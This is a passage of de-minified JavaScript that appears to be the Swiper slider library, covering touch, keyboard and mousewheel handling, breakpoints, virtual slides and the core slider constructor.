                  t.velocity = f / m, t.velocity /= 2, Math.abs(t.velocity) < i.freeModeMinimumVelocity && (t.velocity = 0), (150 < m || 300 < ee.now() - h.time) && (t.velocity = 0);
                } else t.velocity = 0;
                t.velocity *= i.freeModeMomentumVelocityRatio, a.velocities.length = 0;
                var g = 1e3 * i.freeModeMomentumRatio,
                  b = t.velocity * g,
                  w = t.translate + b;
                r && (w = -w);
                var y,
                  x,
                  T = !1,
                  E = 20 * Math.abs(t.velocity) * i.freeModeMomentumBounceRatio;
                if (w < t.maxTranslate()) i.freeModeMomentumBounce ? (w + t.maxTranslate() < -E && (w = t.maxTranslate() - E), y = t.maxTranslate(), T = !0, a.allowMomentumBounce = !0) : w = t.maxTranslate(), i.loop && i.centeredSlides && (x = !0);else if (w > t.minTranslate()) i.freeModeMomentumBounce ? (w - t.minTranslate() > E && (w = t.minTranslate() + E), y = t.minTranslate(), T = !0, a.allowMomentumBounce = !0) : w = t.minTranslate(), i.loop && i.centeredSlides && (x = !0);else if (i.freeModeSticky) {
                  for (var S, C = 0; C < l.length; C += 1) if (l[C] > -w) {
                    S = C;
                    break;
                  }
                  w = -(w = Math.abs(l[S] - w) < Math.abs(l[S - 1] - w) || "next" === t.swipeDirection ? l[S] : l[S - 1]);
                }
                if (x && t.once("transitionEnd", function () {
                  t.loopFix();
                }), 0 !== t.velocity) g = r ? Math.abs((-w - t.translate) / t.velocity) : Math.abs((w - t.translate) / t.velocity);else if (i.freeModeSticky) return void t.slideToClosest();
                i.freeModeMomentumBounce && T ? (t.updateProgress(y), t.setTransition(g), t.setTranslate(w), t.transitionStart(!0, t.swipeDirection), t.animating = !0, n.transitionEnd(function () {
                  t && !t.destroyed && a.allowMomentumBounce && (t.emit("momentumBounce"), t.setTransition(i.speed), t.setTranslate(y), n.transitionEnd(function () {
                    t && !t.destroyed && t.transitionEnd();
                  }));
                })) : t.velocity ? (t.updateProgress(w), t.setTransition(g), t.setTranslate(w), t.transitionStart(!0, t.swipeDirection), t.animating || (t.animating = !0, n.transitionEnd(function () {
                  t && !t.destroyed && t.transitionEnd();
                }))) : t.updateProgress(w), t.updateActiveIndex(), t.updateSlidesClasses();
              } else if (i.freeModeSticky) return void t.slideToClosest();
              (!i.freeModeMomentum || u >= i.longSwipesMs) && (t.updateProgress(), t.updateActiveIndex(), t.updateSlidesClasses());
            } else {
              for (var M = 0, z = t.slidesSizesGrid[0], P = 0; P < o.length; P += i.slidesPerGroup) void 0 !== o[P + i.slidesPerGroup] ? p >= o[P] && p < o[P + i.slidesPerGroup] && (z = o[(M = P) + i.slidesPerGroup] - o[P]) : p >= o[P] && (M = P, z = o[o.length - 1] - o[o.length - 2]);
              var k = (p - o[M]) / z;
              if (u > i.longSwipesMs) {
                if (!i.longSwipes) return void t.slideTo(t.activeIndex);
                "next" === t.swipeDirection && (k >= i.longSwipesRatio ? t.slideTo(M + i.slidesPerGroup) : t.slideTo(M)), "prev" === t.swipeDirection && (k > 1 - i.longSwipesRatio ? t.slideTo(M + i.slidesPerGroup) : t.slideTo(M));
              } else {
                if (!i.shortSwipes) return void t.slideTo(t.activeIndex);
                "next" === t.swipeDirection && t.slideTo(M + i.slidesPerGroup), "prev" === t.swipeDirection && t.slideTo(M);
              }
            }
          }.bind(e), e.onClick = function (e) {
            this.allowClick || (this.params.preventClicks && e.preventDefault(), this.params.preventClicksPropagation && this.animating && (e.stopPropagation(), e.stopImmediatePropagation()));
          }.bind(e);
          var r = "container" === t.touchEventsTarget ? i : s,
            n = !!t.nested;
          if (te.touch || !te.pointerEvents && !te.prefixedPointerEvents) {
            if (te.touch) {
              var o = !("touchstart" !== a.start || !te.passiveListener || !t.passiveListeners) && {
                passive: !0,
                capture: !1
              };
              r.addEventListener(a.start, e.onTouchStart, o), r.addEventListener(a.move, e.onTouchMove, te.passiveListener ? {
                passive: !1,
                capture: n
              } : n), r.addEventListener(a.end, e.onTouchEnd, o);
            }
            (t.simulateTouch && !g.ios && !g.android || t.simulateTouch && !te.touch && g.ios) && (r.addEventListener("mousedown", e.onTouchStart, !1), f.addEventListener("mousemove", e.onTouchMove, n), f.addEventListener("mouseup", e.onTouchEnd, !1));
          } else r.addEventListener(a.start, e.onTouchStart, !1), f.addEventListener(a.move, e.onTouchMove, n), f.addEventListener(a.end, e.onTouchEnd, !1);
          (t.preventClicks || t.preventClicksPropagation) && r.addEventListener("click", e.onClick, !0), e.on(g.ios || g.android ? "resize orientationchange observerUpdate" : "resize observerUpdate", b, !0);
        },
        detachEvents: function () {
          var e = this,
            t = e.params,
            a = e.touchEvents,
            i = e.el,
            s = e.wrapperEl,
            r = "container" === t.touchEventsTarget ? i : s,
            n = !!t.nested;
          if (te.touch || !te.pointerEvents && !te.prefixedPointerEvents) {
            if (te.touch) {
              var o = !("onTouchStart" !== a.start || !te.passiveListener || !t.passiveListeners) && {
                passive: !0,
                capture: !1
              };
              r.removeEventListener(a.start, e.onTouchStart, o), r.removeEventListener(a.move, e.onTouchMove, n), r.removeEventListener(a.end, e.onTouchEnd, o);
            }
            (t.simulateTouch && !g.ios && !g.android || t.simulateTouch && !te.touch && g.ios) && (r.removeEventListener("mousedown", e.onTouchStart, !1), f.removeEventListener("mousemove", e.onTouchMove, n), f.removeEventListener("mouseup", e.onTouchEnd, !1));
          } else r.removeEventListener(a.start, e.onTouchStart, !1), f.removeEventListener(a.move, e.onTouchMove, n), f.removeEventListener(a.end, e.onTouchEnd, !1);
          (t.preventClicks || t.preventClicksPropagation) && r.removeEventListener("click", e.onClick, !0), e.off(g.ios || g.android ? "resize orientationchange observerUpdate" : "resize observerUpdate", b);
        }
      },
      breakpoints: {
        setBreakpoint: function () {
          var e = this,
            t = e.activeIndex,
            a = e.initialized,
            i = e.loopedSlides;
          void 0 === i && (i = 0);
          var s = e.params,
            r = s.breakpoints;
          if (r && (!r || 0 !== Object.keys(r).length)) {
            var n = e.getBreakpoint(r);
            if (n && e.currentBreakpoint !== n) {
              var o = n in r ? r[n] : void 0;
              o && ["slidesPerView", "spaceBetween", "slidesPerGroup"].forEach(function (e) {
                var t = o[e];
                void 0 !== t && (o[e] = "slidesPerView" !== e || "AUTO" !== t && "auto" !== t ? "slidesPerView" === e ? parseFloat(t) : parseInt(t, 10) : "auto");
              });
              var l = o || e.originalParams,
                d = l.direction && l.direction !== s.direction,
                p = s.loop && (l.slidesPerView !== s.slidesPerView || d);
              d && a && e.changeDirection(), ee.extend(e.params, l), ee.extend(e, {
                allowTouchMove: e.params.allowTouchMove,
                allowSlideNext: e.params.allowSlideNext,
                allowSlidePrev: e.params.allowSlidePrev
              }), e.currentBreakpoint = n, p && a && (e.loopDestroy(), e.loopCreate(), e.updateSlides(), e.slideTo(t - i + e.loopedSlides, 0, !1)), e.emit("breakpoint", l);
            }
          }
        },
        getBreakpoint: function (e) {
          if (e) {
            var t = !1,
              a = [];
            Object.keys(e).forEach(function (e) {
              a.push(e);
            }), a.sort(function (e, t) {
              return parseInt(e, 10) - parseInt(t, 10);
            });
            for (var i = 0; i < a.length; i += 1) {
              var s = a[i];
              this.params.breakpointsInverse ? s <= J.innerWidth && (t = s) : s >= J.innerWidth && !t && (t = s);
            }
            return t || "max";
          }
        }
      },
      checkOverflow: {
        checkOverflow: function () {
          var e = this,
            t = e.isLocked;
          e.isLocked = 1 === e.snapGrid.length, e.allowSlideNext = !e.isLocked, e.allowSlidePrev = !e.isLocked, t !== e.isLocked && e.emit(e.isLocked ? "lock" : "unlock"), t && t !== e.isLocked && (e.isEnd = !1, e.navigation.update());
        }
      },
      classes: {
        addClasses: function () {
          var t = this.classNames,
            a = this.params,
            e = this.rtl,
            i = this.$el,
            s = [];
          s.push("initialized"), s.push(a.direction), a.freeMode && s.push("free-mode"), te.flexbox || s.push("no-flexbox"), a.autoHeight && s.push("autoheight"), e && s.push("rtl"), 1 < a.slidesPerColumn && s.push("multirow"), g.android && s.push("android"), g.ios && s.push("ios"), (I.isIE || I.isEdge) && (te.pointerEvents || te.prefixedPointerEvents) && s.push("wp8-" + a.direction), s.forEach(function (e) {
            t.push(a.containerModifierClass + e);
          }), i.addClass(t.join(" "));
        },
        removeClasses: function () {
          var e = this.$el,
            t = this.classNames;
          e.removeClass(t.join(" "));
        }
      },
      images: {
        loadImage: function (e, t, a, i, s, r) {
          var n;
          function o() {
            r && r();
          }
          e.complete && s ? o() : t ? ((n = new J.Image()).onload = o, n.onerror = o, i && (n.sizes = i), a && (n.srcset = a), t && (n.src = t)) : o();
        },
        preloadImages: function () {
          var e = this;
          function t() {
            null != e && e && !e.destroyed && (void 0 !== e.imagesLoaded && (e.imagesLoaded += 1), e.imagesLoaded === e.imagesToLoad.length && (e.params.updateOnImagesReady && e.update(), e.emit("imagesReady")));
          }
          e.imagesToLoad = e.$el.find("img");
          for (var a = 0; a < e.imagesToLoad.length; a += 1) {
            var i = e.imagesToLoad[a];
            e.loadImage(i, i.currentSrc || i.getAttribute("src"), i.srcset || i.getAttribute("srcset"), i.sizes || i.getAttribute("sizes"), !0, t);
          }
        }
      }
    },
    x = {},
    T = function (u) {
      function h() {
        for (var e, t, s, a = [], i = arguments.length; i--;) a[i] = arguments[i];
        1 === a.length && a[0].constructor && a[0].constructor === Object ? s = a[0] : (t = (e = a)[0], s = e[1]), s || (s = {}), s = ee.extend({}, s), t && !s.el && (s.el = t), u.call(this, s), Object.keys(y).forEach(function (t) {
          Object.keys(y[t]).forEach(function (e) {
            h.prototype[e] || (h.prototype[e] = y[t][e]);
          });
        });
        var r = this;
        void 0 === r.modules && (r.modules = {}), Object.keys(r.modules).forEach(function (e) {
          var t = r.modules[e];
          if (t.params) {
            var a = Object.keys(t.params)[0],
              i = t.params[a];
            if ("object" != typeof i || null === i) return;
            if (!(a in s && "enabled" in i)) return;
            !0 === s[a] && (s[a] = {
              enabled: !0
            }), "object" != typeof s[a] || "enabled" in s[a] || (s[a].enabled = !0), s[a] || (s[a] = {
              enabled: !1
            });
          }
        });
        var n = ee.extend({}, w);
        r.useModulesParams(n), r.params = ee.extend({}, n, x, s), r.originalParams = ee.extend({}, r.params), r.passedParams = ee.extend({}, s);
        var o = (r.$ = L)(r.params.el);
        if (t = o[0]) {
          if (1 < o.length) {
            var l = [];
            return o.each(function (e, t) {
              var a = ee.extend({}, s, {
                el: t
              });
              l.push(new h(a));
            }), l;
          }
          t.swiper = r, o.data("swiper", r);
          var d,
            p,
            c = o.children("." + r.params.wrapperClass);
          return ee.extend(r, {
            $el: o,
            el: t,
            $wrapperEl: c,
            wrapperEl: c[0],
            classNames: [],
            slides: L(),
            slidesGrid: [],
            snapGrid: [],
            slidesSizesGrid: [],
            isHorizontal: function () {
              return "horizontal" === r.params.direction;
            },
            isVertical: function () {
              return "vertical" === r.params.direction;
            },
            rtl: "rtl" === t.dir.toLowerCase() || "rtl" === o.css("direction"),
            rtlTranslate: "horizontal" === r.params.direction && ("rtl" === t.dir.toLowerCase() || "rtl" === o.css("direction")),
            wrongRTL: "-webkit-box" === c.css("display"),
            activeIndex: 0,
            realIndex: 0,
            isBeginning: !0,
            isEnd: !1,
            translate: 0,
            previousTranslate: 0,
            progress: 0,
            velocity: 0,
            animating: !1,
            allowSlideNext: r.params.allowSlideNext,
            allowSlidePrev: r.params.allowSlidePrev,
            touchEvents: (d = ["touchstart", "touchmove", "touchend"], p = ["mousedown", "mousemove", "mouseup"], te.pointerEvents ? p = ["pointerdown", "pointermove", "pointerup"] : te.prefixedPointerEvents && (p = ["MSPointerDown", "MSPointerMove", "MSPointerUp"]), r.touchEventsTouch = {
              start: d[0],
              move: d[1],
              end: d[2]
            }, r.touchEventsDesktop = {
              start: p[0],
              move: p[1],
              end: p[2]
            }, te.touch || !r.params.simulateTouch ? r.touchEventsTouch : r.touchEventsDesktop),
            touchEventsData: {
              isTouched: void 0,
              isMoved: void 0,
              allowTouchCallbacks: void 0,
              touchStartTime: void 0,
              isScrolling: void 0,
              currentTranslate: void 0,
              startTranslate: void 0,
              allowThresholdMove: void 0,
              formElements: "input, select, option, textarea, button, video",
              lastClickTime: ee.now(),
              clickTimeout: void 0,
              velocities: [],
              allowMomentumBounce: void 0,
              isTouchEvent: void 0,
              startMoving: void 0
            },
            allowClick: !0,
            allowTouchMove: r.params.allowTouchMove,
            touches: {
              startX: 0,
              startY: 0,
              currentX: 0,
              currentY: 0,
              diff: 0
            },
            imagesToLoad: [],
            imagesLoaded: 0
          }), r.useModules(), r.params.init && r.init(), r;
        }
      }
      u && (h.__proto__ = u);
      var e = {
        extendedDefaults: {
          configurable: !0
        },
        defaults: {
          configurable: !0
        },
        Class: {
          configurable: !0
        },
        $: {
          configurable: !0
        }
      };
      return ((h.prototype = Object.create(u && u.prototype)).constructor = h).prototype.slidesPerViewDynamic = function () {
        var e = this,
          t = e.params,
          a = e.slides,
          i = e.slidesGrid,
          s = e.size,
          r = e.activeIndex,
          n = 1;
        if (t.centeredSlides) {
          for (var o, l = a[r].swiperSlideSize, d = r + 1; d < a.length; d += 1) a[d] && !o && (n += 1, s < (l += a[d].swiperSlideSize) && (o = !0));
          for (var p = r - 1; 0 <= p; p -= 1) a[p] && !o && (n += 1, s < (l += a[p].swiperSlideSize) && (o = !0));
        } else for (var c = r + 1; c < a.length; c += 1) i[c] - i[r] < s && (n += 1);
        return n;
      }, h.prototype.update = function () {
        var a = this;
        if (a && !a.destroyed) {
          var e = a.snapGrid,
            t = a.params;
          t.breakpoints && a.setBreakpoint(), a.updateSize(), a.updateSlides(), a.updateProgress(), a.updateSlidesClasses(), a.params.freeMode ? (i(), a.params.autoHeight && a.updateAutoHeight()) : (("auto" === a.params.slidesPerView || 1 < a.params.slidesPerView) && a.isEnd && !a.params.centeredSlides ? a.slideTo(a.slides.length - 1, 0, !1, !0) : a.slideTo(a.activeIndex, 0, !1, !0)) || i(), t.watchOverflow && e !== a.snapGrid && a.checkOverflow(), a.emit("update");
        }
        function i() {
          var e = a.rtlTranslate ? -1 * a.translate : a.translate,
            t = Math.min(Math.max(e, a.maxTranslate()), a.minTranslate());
          a.setTranslate(t), a.updateActiveIndex(), a.updateSlidesClasses();
        }
      }, h.prototype.changeDirection = function (a, e) {
        void 0 === e && (e = !0);
        var t = this,
          i = t.params.direction;
        return a || (a = "horizontal" === i ? "vertical" : "horizontal"), a === i || "horizontal" !== a && "vertical" !== a || ("vertical" === i && (t.$el.removeClass(t.params.containerModifierClass + "vertical wp8-vertical").addClass("" + t.params.containerModifierClass + a), (I.isIE || I.isEdge) && (te.pointerEvents || te.prefixedPointerEvents) && t.$el.addClass(t.params.containerModifierClass + "wp8-" + a)), "horizontal" === i && (t.$el.removeClass(t.params.containerModifierClass + "horizontal wp8-horizontal").addClass("" + t.params.containerModifierClass + a), (I.isIE || I.isEdge) && (te.pointerEvents || te.prefixedPointerEvents) && t.$el.addClass(t.params.containerModifierClass + "wp8-" + a)), t.params.direction = a, t.slides.each(function (e, t) {
          "vertical" === a ? t.style.width = "" : t.style.height = "";
        }), t.emit("changeDirection"), e && t.update()), t;
      }, h.prototype.init = function () {
        var e = this;
        e.initialized || (e.emit("beforeInit"), e.params.breakpoints && e.setBreakpoint(), e.addClasses(), e.params.loop && e.loopCreate(), e.updateSize(), e.updateSlides(), e.params.watchOverflow && e.checkOverflow(), e.params.grabCursor && e.setGrabCursor(), e.params.preloadImages && e.preloadImages(), e.params.loop ? e.slideTo(e.params.initialSlide + e.loopedSlides, 0, e.params.runCallbacksOnInit) : e.slideTo(e.params.initialSlide, 0, e.params.runCallbacksOnInit), e.attachEvents(), e.initialized = !0, e.emit("init"));
      }, h.prototype.destroy = function (e, t) {
        void 0 === e && (e = !0), void 0 === t && (t = !0);
        var a = this,
          i = a.params,
          s = a.$el,
          r = a.$wrapperEl,
          n = a.slides;
        return void 0 === a.params || a.destroyed || (a.emit("beforeDestroy"), a.initialized = !1, a.detachEvents(), i.loop && a.loopDestroy(), t && (a.removeClasses(), s.removeAttr("style"), r.removeAttr("style"), n && n.length && n.removeClass([i.slideVisibleClass, i.slideActiveClass, i.slideNextClass, i.slidePrevClass].join(" ")).removeAttr("style").removeAttr("data-swiper-slide-index").removeAttr("data-swiper-column").removeAttr("data-swiper-row")), a.emit("destroy"), Object.keys(a.eventsListeners).forEach(function (e) {
          a.off(e);
        }), !1 !== e && (a.$el[0].swiper = null, a.$el.data("swiper", null), ee.deleteProps(a)), a.destroyed = !0), null;
      }, h.extendDefaults = function (e) {
        ee.extend(x, e);
      }, e.extendedDefaults.get = function () {
        return x;
      }, e.defaults.get = function () {
        return w;
      }, e.Class.get = function () {
        return u;
      }, e.$.get = function () {
        return L;
      }, Object.defineProperties(h, e), h;
    }(n),
    E = {
      name: "device",
      proto: {
        device: g
      },
      static: {
        device: g
      }
    },
    S = {
      name: "support",
      proto: {
        support: te
      },
      static: {
        support: te
      }
    },
    C = {
      name: "browser",
      proto: {
        browser: I
      },
      static: {
        browser: I
      }
    },
    M = {
      name: "resize",
      create: function () {
        var e = this;
        ee.extend(e, {
          resize: {
            resizeHandler: function () {
              e && !e.destroyed && e.initialized && (e.emit("beforeResize"), e.emit("resize"));
            },
            orientationChangeHandler: function () {
              e && !e.destroyed && e.initialized && e.emit("orientationchange");
            }
          }
        });
      },
      on: {
        init: function () {
          J.addEventListener("resize", this.resize.resizeHandler), J.addEventListener("orientationchange", this.resize.orientationChangeHandler);
        },
        destroy: function () {
          J.removeEventListener("resize", this.resize.resizeHandler), J.removeEventListener("orientationchange", this.resize.orientationChangeHandler);
        }
      }
    },
    z = {
      func: J.MutationObserver || J.WebkitMutationObserver,
      attach: function (e, t) {
        void 0 === t && (t = {});
        var a = this,
          i = new z.func(function (e) {
            if (1 !== e.length) {
              var t = function () {
                a.emit("observerUpdate", e[0]);
              };
              J.requestAnimationFrame ? J.requestAnimationFrame(t) : J.setTimeout(t, 0);
            } else a.emit("observerUpdate", e[0]);
          });
        i.observe(e, {
          attributes: void 0 === t.attributes || t.attributes,
          childList: void 0 === t.childList || t.childList,
          characterData: void 0 === t.characterData || t.characterData
        }), a.observer.observers.push(i);
      },
      init: function () {
        var e = this;
        if (te.observer && e.params.observer) {
          if (e.params.observeParents) for (var t = e.$el.parents(), a = 0; a < t.length; a += 1) e.observer.attach(t[a]);
          e.observer.attach(e.$el[0], {
            childList: e.params.observeSlideChildren
          }), e.observer.attach(e.$wrapperEl[0], {
            attributes: !1
          });
        }
      },
      destroy: function () {
        this.observer.observers.forEach(function (e) {
          e.disconnect();
        }), this.observer.observers = [];
      }
    },
    P = {
      name: "observer",
      params: {
        observer: !1,
        observeParents: !1,
        observeSlideChildren: !1
      },
      create: function () {
        ee.extend(this, {
          observer: {
            init: z.init.bind(this),
            attach: z.attach.bind(this),
            destroy: z.destroy.bind(this),
            observers: []
          }
        });
      },
      on: {
        init: function () {
          this.observer.init();
        },
        destroy: function () {
          this.observer.destroy();
        }
      }
    },
    k = {
      update: function (e) {
        var t = this,
          a = t.params,
          i = a.slidesPerView,
          s = a.slidesPerGroup,
          r = a.centeredSlides,
          n = t.params.virtual,
          o = n.addSlidesBefore,
          l = n.addSlidesAfter,
          d = t.virtual,
          p = d.from,
          c = d.to,
          u = d.slides,
          h = d.slidesGrid,
          v = d.renderSlide,
          f = d.offset;
        t.updateActiveIndex();
        var m,
          g,
          b,
          w = t.activeIndex || 0;
        m = t.rtlTranslate ? "right" : t.isHorizontal() ? "left" : "top", r ? (g = Math.floor(i / 2) + s + o, b = Math.floor(i / 2) + s + l) : (g = i + (s - 1) + o, b = s + l);
        var y = Math.max((w || 0) - b, 0),
          x = Math.min((w || 0) + g, u.length - 1),
          T = (t.slidesGrid[y] || 0) - (t.slidesGrid[0] || 0);
        function E() {
          t.updateSlides(), t.updateProgress(), t.updateSlidesClasses(), t.lazy && t.params.lazy.enabled && t.lazy.load();
        }
        if (ee.extend(t.virtual, {
          from: y,
          to: x,
          offset: T,
          slidesGrid: t.slidesGrid
        }), p === y && c === x && !e) return t.slidesGrid !== h && T !== f && t.slides.css(m, T + "px"), void t.updateProgress();
        if (t.params.virtual.renderExternal) return t.params.virtual.renderExternal.call(t, {
          offset: T,
          from: y,
          to: x,
          slides: function () {
            for (var e = [], t = y; t <= x; t += 1) e.push(u[t]);
            return e;
          }()
        }), void E();
        var S = [],
          C = [];
        if (e) t.$wrapperEl.find("." + t.params.slideClass).remove();else for (var M = p; M <= c; M += 1) (M < y || x < M) && t.$wrapperEl.find("." + t.params.slideClass + '[data-swiper-slide-index="' + M + '"]').remove();
        for (var z = 0; z < u.length; z += 1) y <= z && z <= x && (void 0 === c || e ? C.push(z) : (c < z && C.push(z), z < p && S.push(z)));
        C.forEach(function (e) {
          t.$wrapperEl.append(v(u[e], e));
        }), S.sort(function (e, t) {
          return t - e;
        }).forEach(function (e) {
          t.$wrapperEl.prepend(v(u[e], e));
        }), t.$wrapperEl.children(".swiper-slide").css(m, T + "px"), E();
      },
      renderSlide: function (e, t) {
        var a = this,
          i = a.params.virtual;
        if (i.cache && a.virtual.cache[t]) return a.virtual.cache[t];
        var s = i.renderSlide ? L(i.renderSlide.call(a, e, t)) : L('<div class="' + a.params.slideClass + '" data-swiper-slide-index="' + t + '">' + e + "</div>");
        return s.attr("data-swiper-slide-index") || s.attr("data-swiper-slide-index", t), i.cache && (a.virtual.cache[t] = s), s;
      },
      appendSlide: function (e) {
        if ("object" == typeof e && "length" in e) for (var t = 0; t < e.length; t += 1) e[t] && this.virtual.slides.push(e[t]);else this.virtual.slides.push(e);
        this.virtual.update(!0);
      },
      prependSlide: function (e) {
        var t = this,
          a = t.activeIndex,
          i = a + 1,
          s = 1;
        if (Array.isArray(e)) {
          for (var r = 0; r < e.length; r += 1) e[r] && t.virtual.slides.unshift(e[r]);
          i = a + e.length, s = e.length;
        } else t.virtual.slides.unshift(e);
        if (t.params.virtual.cache) {
          var n = t.virtual.cache,
            o = {};
          Object.keys(n).forEach(function (e) {
            o[parseInt(e, 10) + s] = n[e];
          }), t.virtual.cache = o;
        }
        t.virtual.update(!0), t.slideTo(i, 0);
      },
      removeSlide: function (e) {
        var t = this;
        if (null != e) {
          var a = t.activeIndex;
          if (Array.isArray(e)) for (var i = e.length - 1; 0 <= i; i -= 1) t.virtual.slides.splice(e[i], 1), t.params.virtual.cache && delete t.virtual.cache[e[i]], e[i] < a && (a -= 1), a = Math.max(a, 0);else t.virtual.slides.splice(e, 1), t.params.virtual.cache && delete t.virtual.cache[e], e < a && (a -= 1), a = Math.max(a, 0);
          t.virtual.update(!0), t.slideTo(a, 0);
        }
      },
      removeAllSlides: function () {
        var e = this;
        e.virtual.slides = [], e.params.virtual.cache && (e.virtual.cache = {}), e.virtual.update(!0), e.slideTo(0, 0);
      }
    },
    $ = {
      name: "virtual",
      params: {
        virtual: {
          enabled: !1,
          slides: [],
          cache: !0,
          renderSlide: null,
          renderExternal: null,
          addSlidesBefore: 0,
          addSlidesAfter: 0
        }
      },
      create: function () {
        var e = this;
        ee.extend(e, {
          virtual: {
            update: k.update.bind(e),
            appendSlide: k.appendSlide.bind(e),
            prependSlide: k.prependSlide.bind(e),
            removeSlide: k.removeSlide.bind(e),
            removeAllSlides: k.removeAllSlides.bind(e),
            renderSlide: k.renderSlide.bind(e),
            slides: e.params.virtual.slides,
            cache: {}
          }
        });
      },
      on: {
        beforeInit: function () {
          var e = this;
          if (e.params.virtual.enabled) {
            e.classNames.push(e.params.containerModifierClass + "virtual");
            var t = {
              watchSlidesProgress: !0
            };
            ee.extend(e.params, t), ee.extend(e.originalParams, t), e.params.initialSlide || e.virtual.update();
          }
        },
        setTranslate: function () {
          this.params.virtual.enabled && this.virtual.update();
        }
      }
    },
    D = {
      handle: function (e) {
        var t = this,
          a = t.rtlTranslate,
          i = e;
        i.originalEvent && (i = i.originalEvent);
        var s = i.keyCode || i.charCode;
        if (!t.allowSlideNext && (t.isHorizontal() && 39 === s || t.isVertical() && 40 === s)) return !1;
        if (!t.allowSlidePrev && (t.isHorizontal() && 37 === s || t.isVertical() && 38 === s)) return !1;
        if (!(i.shiftKey || i.altKey || i.ctrlKey || i.metaKey || f.activeElement && f.activeElement.nodeName && ("input" === f.activeElement.nodeName.toLowerCase() || "textarea" === f.activeElement.nodeName.toLowerCase()))) {
          if (t.params.keyboard.onlyInViewport && (37 === s || 39 === s || 38 === s || 40 === s)) {
            var r = !1;
            if (0 < t.$el.parents("." + t.params.slideClass).length && 0 === t.$el.parents("." + t.params.slideActiveClass).length) return;
            var n = J.innerWidth,
              o = J.innerHeight,
              l = t.$el.offset();
            a && (l.left -= t.$el[0].scrollLeft);
            for (var d = [[l.left, l.top], [l.left + t.width, l.top], [l.left, l.top + t.height], [l.left + t.width, l.top + t.height]], p = 0; p < d.length; p += 1) {
              var c = d[p];
              0 <= c[0] && c[0] <= n && 0 <= c[1] && c[1] <= o && (r = !0);
            }
            if (!r) return;
          }
          t.isHorizontal() ? (37 !== s && 39 !== s || (i.preventDefault ? i.preventDefault() : i.returnValue = !1), (39 === s && !a || 37 === s && a) && t.slideNext(), (37 === s && !a || 39 === s && a) && t.slidePrev()) : (38 !== s && 40 !== s || (i.preventDefault ? i.preventDefault() : i.returnValue = !1), 40 === s && t.slideNext(), 38 === s && t.slidePrev()), t.emit("keyPress", s);
        }
      },
      enable: function () {
        this.keyboard.enabled || (L(f).on("keydown", this.keyboard.handle), this.keyboard.enabled = !0);
      },
      disable: function () {
        this.keyboard.enabled && (L(f).off("keydown", this.keyboard.handle), this.keyboard.enabled = !1);
      }
    },
    O = {
      name: "keyboard",
      params: {
        keyboard: {
          enabled: !1,
          onlyInViewport: !0
        }
      },
      create: function () {
        ee.extend(this, {
          keyboard: {
            enabled: !1,
            enable: D.enable.bind(this),
            disable: D.disable.bind(this),
            handle: D.handle.bind(this)
          }
        });
      },
      on: {
        init: function () {
          this.params.keyboard.enabled && this.keyboard.enable();
        },
        destroy: function () {
          this.keyboard.enabled && this.keyboard.disable();
        }
      }
    };
  var A = {
      lastScrollTime: ee.now(),
      event: -1 < J.navigator.userAgent.indexOf("firefox") ? "DOMMouseScroll" : function () {
        var e = "onwheel",
          t = e in f;
        if (!t) {
          var a = f.createElement("div");
          a.setAttribute(e, "return;"), t = "function" == typeof a[e];
        }
        return !t && f.implementation && f.implementation.hasFeature && !0 !== f.implementation.hasFeature("", "") && (t = f.implementation.hasFeature("Events.wheel", "3.0")), t;
      }() ? "wheel" : "mousewheel",
      normalize: function (e) {
        var t = 0,
          a = 0,
          i = 0,
          s = 0;
        return "detail" in e && (a = e.detail), "wheelDelta" in e && (a = -e.wheelDelta / 120), "wheelDeltaY" in e && (a = -e.wheelDeltaY / 120), "wheelDeltaX" in e && (t = -e.wheelDeltaX / 120), "axis" in e && e.axis === e.HORIZONTAL_AXIS && (t = a, a = 0), i = 10 * t, s = 10 * a, "deltaY" in e && (s = e.deltaY), "deltaX" in e && (i = e.deltaX), (i || s) && e.deltaMode && (1 === e.deltaMode ? (i *= 40, s *= 40) : (i *= 800, s *= 800)), i && !t && (t = i < 1 ? -1 : 1), s && !a && (a = s < 1 ? -1 : 1), {
          spinX: t,
          spinY: a,
          pixelX: i,
          pixelY: s
        };
      },
      handleMouseEnter: function () {
        this.mouseEntered = !0;
      },
      handleMouseLeave: function () {
        this.mouseEntered = !1;
      },
      handle: function (e) {
        var t = e,
          a = this,
          i = a.params.mousewheel;
        if (!a.mouseEntered && !i.releaseOnEdges) return !0;
        t.originalEvent && (t = t.originalEvent);
        var s = 0,
          r = a.rtlTranslate ? -1 : 1,
          n = A.normalize(t);
        if (i.forceToAxis) {
          if (a.isHorizontal()) {
            if (!(Math.abs(n.pixelX) > Math.abs(n.pixelY))) return !0;
            s = n.pixelX * r;
          } else {
            if (!(Math.abs(n.pixelY) > Math.abs(n.pixelX))) return !0;
            s = n.pixelY;
          }
        } else s = Math.abs(n.pixelX) > Math.abs(n.pixelY) ? -n.pixelX * r : -n.pixelY;
        if (0 === s) return !0;
        if (i.invert && (s = -s), a.params.freeMode) {
          a.params.loop && a.loopFix();
          var o = a.getTranslate() + s * i.sensitivity,
            l = a.isBeginning,
            d = a.isEnd;
          if (o >= a.minTranslate() && (o = a.minTranslate()), o <= a.maxTranslate() && (o = a.maxTranslate()), a.setTransition(0), a.setTranslate(o), a.updateProgress(), a.updateActiveIndex(), a.updateSlidesClasses(), (!l && a.isBeginning || !d && a.isEnd) && a.updateSlidesClasses(), a.params.freeModeSticky && (clearTimeout(a.mousewheel.timeout), a.mousewheel.timeout = ee.nextTick(function () {
            a.slideToClosest();
          }, 300)), a.emit("scroll", t), a.params.autoplay && a.params.autoplayDisableOnInteraction && a.autoplay.stop(), o === a.minTranslate() || o === a.maxTranslate()) return !0;
        } else {
          if (60 < ee.now() - a.mousewheel.lastScrollTime) if (s < 0) {
            if (a.isEnd && !a.params.loop || a.animating) {
              if (i.releaseOnEdges) return !0;
            } else a.slideNext(), a.emit("scroll", t);
          } else if (a.isBeginning && !a.params.loop || a.animating) {
            if (i.releaseOnEdges) return !0;
          } else a.slidePrev(), a.emit("scroll", t);
          a.mousewheel.lastScrollTime = new J.Date().getTime();
        }
        return t.preventDefault ? t.preventDefault() : t.returnValue = !1, !1;
      },
      enable: function () {
        var e = this;
        if (!A.event) return !1;
        if (e.mousewheel.enabled) return !1;
        var t = e.$el;
        return "container" !== e.params.mousewheel.eventsTarged && (t = L(e.params.mousewheel.eventsTarged)), t.on("mouseenter", e.mousewheel.handleMouseEnter), t.on("mouseleave", e.mousewheel.handleMouseLeave), t.on(A.event, e.mousewheel.handle), e.mousewheel.enabled = !0;
      },
      disable: function () {
        var e = this;
        if (!A.event) return !1;
        if (!e.mousewheel.enabled) return !1;
        var t = e.$el;
